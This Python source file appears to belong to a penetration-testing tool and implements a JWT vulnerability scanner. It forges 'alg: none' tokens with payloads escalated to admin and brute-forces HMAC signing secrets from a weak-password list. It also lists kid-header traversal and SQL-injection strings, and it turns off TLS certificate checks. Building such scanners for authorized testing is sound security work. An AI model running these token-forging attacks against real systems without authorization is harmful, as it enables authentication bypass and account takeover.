"""
Jarwis AGI Pen Test - JWT Attack Scanner
Detects JWT vulnerabilities (A07:2021 - Identification and Authentication Failures)
Based on Web Hacking 101 techniques - adapted for 2025
"""

import asyncio
import logging
import re
import json
import base64
import hashlib
import hmac
from typing import Dict, List, Optional
from dataclasses import dataclass
from urllib.parse import urlparse, urljoin
import aiohttp
import ssl

logger = logging.getLogger(__name__)


@dataclass
class ScanResult:
    id: str
    category: str
    severity: str
    title: str
    description: str
    url: str
    method: str
    parameter: str = ""
    evidence: str = ""
    remediation: str = ""
    cwe_id: str = ""
    poc: str = ""
    reasoning: str = ""
    request_data: str = ""
    response_data: str = ""


class JWTAttackScanner:
    """
    Scans for JWT (JSON Web Token) vulnerabilities
    OWASP A07:2021 - Identification and Authentication Failures
    CWE-287: Improper Authentication
    
    Attack vectors:
    - Algorithm confusion (None, HS256 with RS256 public key)
    - Weak secret keys
    - Missing signature verification
    - Key injection (jwk, jku, kid)
    - Token reuse
    - Expiration bypass
    """
    
    # Common weak secrets
    WEAK_SECRETS = [
        'secret', 'password', '123456', 'jwt_secret', 'secret_key',
        'key', 'private', 'admin', 'test', 'development',
        'your-256-bit-secret', 'your_secret_key', 'mysecret',
        'changeme', 'changeit', 'default', 'example',
        '', 'null', 'none', 'undefined',
        'supersecret', 'topsecret', 'mysecretkey', 'secretkey',
        'jwt', 'token', 'auth', 'authentication',
        'HS256', 'RS256', 'ES256',
        '1234567890', 'qwerty', 'letmein',
    ]
    
    # Common JWT header locations
    JWT_LOCATIONS = [
        'Authorization',  # Bearer token
        'Cookie',  # JWT in cookie
        'X-Access-Token',
        'X-Auth-Token',
        'X-JWT-Token',
        'Token',
        'Auth',
    ]
    
    # API endpoints that typically use JWT
    JWT_ENDPOINTS = [
        '/api/me', '/api/user', '/api/profile', '/api/account',
        '/api/users', '/api/admin', '/api/dashboard',
        '/api/protected', '/api/private', '/api/secure',
        '/api/v1/user', '/api/v1/me', '/api/v2/user',
        '/user/profile', '/account/settings', '/dashboard',
    ]
    
    def __init__(self, config: dict, context):
        self.config = config
        self.context = context
        self.browser = None
        self.results: List[ScanResult] = []
        self.rate_limit = config.get('rate_limit', 10)
        self.timeout = config.get('timeout', 15)
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        self.discovered_jwts: List[str] = []
        
    async def scan(self) -> List[ScanResult]:
        """Main scan method"""
        logger.info("Starting JWT Attack scan...")
        self.results = []
        
        base_url = self.config.get('target', {}).get('url', '')
        if not base_url:
            base_url = self.config.get('target_url', '')
        
        if not base_url:
            return self.results
        
        # Collect endpoints
        urls_to_test = set()
        for endpoint in self.JWT_ENDPOINTS:
            urls_to_test.add(urljoin(base_url, endpoint))
        
        if hasattr(self.context, 'endpoints'):
            for endpoint in self.context.endpoints[:30]:
                url = endpoint.get('url', '') if isinstance(endpoint, dict) else str(endpoint)
                if url:
                    urls_to_test.add(url)
        
        # Also check cookies and responses for JWTs
        if hasattr(self.context, 'cookies'):
            for cookie_name, cookie_value in self.context.cookies.items():
                if self._is_jwt(cookie_value):
                    self.discovered_jwts.append(cookie_value)
        
        connector = aiohttp.TCPConnector(ssl=self.ssl_context, limit=10)
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=self.timeout)
        ) as session:
            
            # First, discover JWTs from endpoints
            for url in urls_to_test:
                try:
                    await asyncio.sleep(1 / self.rate_limit)
                    await self._discover_jwt(session, url)
                except Exception as e:
                    logger.debug(f"Error discovering JWT at {url}: {e}")
            
            # Then test discovered JWTs
            for jwt in self.discovered_jwts:
                await self._test_jwt_vulnerabilities(session, base_url, jwt)
        
        logger.info(f"JWT scan complete. Found {len(self.results)} vulnerabilities")
        return self.results
    
    def _is_jwt(self, token: str) -> bool:
        """Check if string is a JWT"""
        if not token or not isinstance(token, str):
            return False
        
        parts = token.split('.')
        if len(parts) != 3:
            return False
        
        try:
            # Try to decode header
            header = self._base64_decode(parts[0])
            header_json = json.loads(header)
            
            # Check for typical JWT header fields
            if 'alg' in header_json or 'typ' in header_json:
                return True
        except Exception:
            pass
        
        return False
    
    def _base64_decode(self, data: str) -> str:
        """Decode base64url"""
        padding = 4 - len(data) % 4
        if padding != 4:
            data += '=' * padding
        data = data.replace('-', '+').replace('_', '/')
        return base64.b64decode(data).decode('utf-8')
    
    def _base64_encode(self, data: str) -> str:
        """Encode to base64url"""
        encoded = base64.b64encode(data.encode('utf-8')).decode('utf-8')
        return encoded.replace('+', '-').replace('/', '_').rstrip('=')
    
    def _parse_jwt(self, token: str) -> dict:
        """Parse JWT and return components"""
        try:
            parts = token.split('.')
            header = json.loads(self._base64_decode(parts[0]))
            payload = json.loads(self._base64_decode(parts[1]))
            signature = parts[2]
            return {
                'header': header,
                'payload': payload,
                'signature': signature,
                'raw': token
            }
        except Exception as e:
            return None
    
    def _create_jwt(self, header: dict, payload: dict, secret: str = '') -> str:
        """Create a JWT with given header, payload, and secret"""
        header_b64 = self._base64_encode(json.dumps(header, separators=(',', ':')))
        payload_b64 = self._base64_encode(json.dumps(payload, separators=(',', ':')))
        
        message = f"{header_b64}.{payload_b64}"
        
        if header.get('alg') == 'none':
            signature = ''
        elif header.get('alg') == 'HS256':
            signature = base64.urlsafe_b64encode(
                hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
            ).decode().rstrip('=')
        elif header.get('alg') == 'HS384':
            signature = base64.urlsafe_b64encode(
                hmac.new(secret.encode(), message.encode(), hashlib.sha384).digest()
            ).decode().rstrip('=')
        elif header.get('alg') == 'HS512':
            signature = base64.urlsafe_b64encode(
                hmac.new(secret.encode(), message.encode(), hashlib.sha512).digest()
            ).decode().rstrip('=')
        else:
            signature = ''
        
        return f"{header_b64}.{payload_b64}.{signature}"
    
    async def _discover_jwt(self, session: aiohttp.ClientSession, url: str):
        """Discover JWTs from endpoint responses"""
        try:
            headers = {'User-Agent': 'Mozilla/5.0'}
            async with session.get(url, headers=headers) as response:
                # Check response headers
                for header in self.JWT_LOCATIONS:
                    value = response.headers.get(header, '')
                    if 'Bearer ' in value:
                        token = value.replace('Bearer ', '').strip()
                        if self._is_jwt(token):
                            self.discovered_jwts.append(token)
                
                # Check cookies
                for cookie in response.cookies.values():
                    if self._is_jwt(cookie.value):
                        self.discovered_jwts.append(cookie.value)
                
                # Check response body for JWTs
                body = await response.text()
                jwt_pattern = r'eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*'
                for match in re.findall(jwt_pattern, body):
                    if self._is_jwt(match):
                        self.discovered_jwts.append(match)
                        
        except Exception as e:
            logger.debug(f"JWT discovery error: {e}")
    
    async def _test_jwt_vulnerabilities(self, session: aiohttp.ClientSession, base_url: str, jwt: str):
        """Test a JWT for various vulnerabilities"""
        parsed = self._parse_jwt(jwt)
        if not parsed:
            return
        
        original_header = parsed['header']
        original_payload = parsed['payload']
        
        # Test 1: Algorithm None attack
        await self._test_alg_none(session, base_url, original_header, original_payload, jwt)
        
        # Test 2: Weak secret brute force
        await self._test_weak_secrets(session, base_url, original_header, original_payload, jwt)
        
        # Test 3: Algorithm confusion (HS256 with RS256)
        await self._test_alg_confusion(session, base_url, original_header, original_payload, jwt)
        
        # Test 4: JWK injection
        await self._test_jwk_injection(session, base_url, original_header, original_payload, jwt)
        
        # Test 5: Kid injection
        await self._test_kid_injection(session, base_url, original_header, original_payload, jwt)
        
        # Test 6: Check for weak configuration
        self._analyze_jwt_config(jwt, parsed)
    
    async def _test_alg_none(self, session, base_url, header, payload, original_jwt):
        """Test algorithm none attack"""
        # Create token with alg: none
        none_headers = [
            {'alg': 'none', 'typ': 'JWT'},
            {'alg': 'None', 'typ': 'JWT'},
            {'alg': 'NONE', 'typ': 'JWT'},
            {'alg': 'nOnE', 'typ': 'JWT'},
        ]
        
        # Modify payload (e.g., escalate privileges)
        modified_payload = payload.copy()
        if 'role' in modified_payload:
            modified_payload['role'] = 'admin'
        if 'admin' in modified_payload:
            modified_payload['admin'] = True
        if 'user_id' in modified_payload:
            modified_payload['user_id'] = 1
        
        for none_header in none_headers:
            forged_jwt = self._create_jwt(none_header, modified_payload)
            
            # Test with trailing dot variations
            test_tokens = [
                forged_jwt,
                forged_jwt + '.',
                forged_jwt.rstrip('.') + '.',
            ]
            
            for test_token in test_tokens:
                is_valid = await self._verify_jwt_accepted(session, base_url, test_token, original_jwt)
                
                if is_valid:
                    result = ScanResult(
                        id=f"JWT-NONE-{len(self.results)+1}",
                        category="A07:2021 - Auth Failures",
                        severity="critical",
                        title="JWT Algorithm None Attack",
                        description="The application accepts JWTs with algorithm 'none', allowing signature bypass.",
                        url=base_url,
                        method="GET/POST",
                        parameter="Authorization",
                        evidence=f"Forged token accepted: {test_token[:50]}...",
                        remediation="Never accept 'none' algorithm. Always verify signatures with a strong algorithm.",
                        cwe_id="CWE-287",
                        poc=f"Authorization: Bearer {test_token}",
                        reasoning="Server accepted JWT with algorithm=none, bypassing signature verification"
                    )
                    self.results.append(result)
                    return
    
    async def _test_weak_secrets(self, session, base_url, header, payload, original_jwt):
        """Test for weak JWT secrets"""
        if header.get('alg') not in ['HS256', 'HS384', 'HS512']:
            return
        
        original_parts = original_jwt.split('.')
        message = f"{original_parts[0]}.{original_parts[1]}"
        original_sig = original_parts[2]
        
        for secret in self.WEAK_SECRETS:
            try:
                # Generate signature with weak secret
                if header.get('alg') == 'HS256':
                    test_sig = base64.urlsafe_b64encode(
                        hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
                    ).decode().rstrip('=')
                elif header.get('alg') == 'HS384':
                    test_sig = base64.urlsafe_b64encode(
                        hmac.new(secret.encode(), message.encode(), hashlib.sha384).digest()
                    ).decode().rstrip('=')
                elif header.get('alg') == 'HS512':
                    test_sig = base64.urlsafe_b64encode(
                        hmac.new(secret.encode(), message.encode(), hashlib.sha512).digest()
                    ).decode().rstrip('=')
                else:
                    continue
                
                if test_sig == original_sig:
                    result = ScanResult(
                        id=f"JWT-WEAK-{len(self.results)+1}",
                        category="A07:2021 - Auth Failures",
                        severity="critical",
                        title="JWT Weak Secret Key",
                        description=f"The JWT is signed with a weak secret key: '{secret}'. This allows forging tokens.",
                        url=base_url,
                        method="GET/POST",
                        parameter="Authorization",
                        evidence=f"Secret discovered: '{secret}'",
                        remediation="Use a strong, random secret key of at least 256 bits for HS256.",
                        cwe_id="CWE-521",
                        poc=f"Forge tokens using secret: '{secret}'",
                        reasoning=f"JWT signature matches when signed with '{secret}'"
                    )
                    self.results.append(result)
                    return
                    
            except Exception:
                pass
    
    async def _test_alg_confusion(self, session, base_url, header, payload, original_jwt):
        """Test algorithm confusion attack (RS256 -> HS256)"""
        if header.get('alg') not in ['RS256', 'RS384', 'RS512']:
            return
        
        # This attack requires the public key, which we might find
        # For now, we just flag potential vulnerability
        result = ScanResult(
            id=f"JWT-ALGCONF-{len(self.results)+1}",
            category="A07:2021 - Auth Failures",
            severity="info",
            title="JWT Uses RSA Algorithm - Algorithm Confusion Possible",
            description="The JWT uses RSA signing. If the public key is exposed, algorithm confusion attack may be possible.",
            url=base_url,
            method="GET/POST",
            parameter="Authorization",
            evidence=f"Algorithm: {header.get('alg')}",
            remediation="Explicitly validate the algorithm in your verification code. Don't trust the alg header.",
            cwe_id="CWE-287",
            reasoning="RSA-signed JWT detected - verify algorithm confusion is not possible"
        )
        self.results.append(result)
    
    async def _test_jwk_injection(self, session, base_url, header, payload, original_jwt):
        """Test JWK header injection"""
        if 'jwk' in header:
            result = ScanResult(
                id=f"JWT-JWK-{len(self.results)+1}",
                category="A07:2021 - Auth Failures",
                severity="high",
                title="JWT Contains JWK Header",
                description="The JWT contains an embedded JWK (JSON Web Key). This may allow key injection attacks.",
                url=base_url,
                method="GET/POST",
                parameter="Authorization",
                evidence=f"JWK in header: {json.dumps(header.get('jwk'))[:100]}",
                remediation="Never trust JWK headers from tokens. Use a server-side key store.",
                cwe_id="CWE-287",
                reasoning="JWK header present - potential key injection"
            )
            self.results.append(result)
    
    async def _test_kid_injection(self, session, base_url, header, payload, original_jwt):
        """Test kid (key ID) injection"""
        if 'kid' not in header:
            return
        
        # kid might be vulnerable to path traversal or SQL injection
        suspicious_kids = [
            '../../../dev/null',
            '../../../../../../etc/passwd',
            "' OR '1'='1",
            '../../public/key.pem',
        ]
        
        # Note: This is informational as we can't easily verify the attack
        result = ScanResult(
            id=f"JWT-KID-{len(self.results)+1}",
            category="A07:2021 - Auth Failures",
            severity="info",
            title="JWT Contains KID Header",
            description=f"The JWT uses kid header: {header.get('kid')}. This may be vulnerable to path traversal or injection.",
            url=base_url,
            method="GET/POST",
            parameter="Authorization",
            evidence=f"kid: {header.get('kid')}",
            remediation="Validate kid values strictly. Use a whitelist of allowed key IDs.",
            cwe_id="CWE-287",
            reasoning="kid header present - verify against injection attacks"
        )
        self.results.append(result)
    
    def _analyze_jwt_config(self, jwt: str, parsed: dict):
        """Analyze JWT for weak configurations"""
        payload = parsed['payload']
        header = parsed['header']
        
        issues = []
        
        # Check expiration
        if 'exp' not in payload:
            issues.append("Missing expiration (exp) claim")
        
        # Check issued at
        if 'iat' not in payload:
            issues.append("Missing issued at (iat) claim")
        
        # Check for sensitive data in payload
        sensitive_fields = ['password', 'secret', 'api_key', 'credit_card']
        for field in sensitive_fields:
            if field in str(payload).lower():
                issues.append(f"Potentially sensitive data in payload: {field}")
        
        if issues:
            result = ScanResult(
                id=f"JWT-CONFIG-{len(self.results)+1}",
                category="A07:2021 - Auth Failures",
                severity="low",
                title="JWT Configuration Issues",
                description="The JWT has potential configuration issues that could weaken security.",
                url="",
                method="",
                evidence="; ".join(issues),
                remediation="Always include exp and iat claims. Never store sensitive data in JWT payload.",
                cwe_id="CWE-287",
                reasoning="JWT analysis found configuration issues"
            )
            self.results.append(result)
    
    async def _verify_jwt_accepted(self, session, base_url, forged_jwt: str, original_jwt: str) -> bool:
        """Verify if a forged JWT is accepted by the server"""
        try:
            # Test on API endpoints
            for endpoint in ['/api/me', '/api/user', '/api/profile', '/api/protected']:
                test_url = urljoin(base_url, endpoint)
                
                headers = {
                    'Authorization': f'Bearer {forged_jwt}',
                    'User-Agent': 'Mozilla/5.0'
                }
                
                async with session.get(test_url, headers=headers) as response:
                    if response.status in [200, 201]:
                        return True
                    
                    # Check if response is different from unauthorized
                    if response.status != 401 and response.status != 403:
                        body = await response.text()
                        if 'user' in body.lower() or 'profile' in body.lower():
                            return True
                            
        except Exception:
            pass
        
        return False
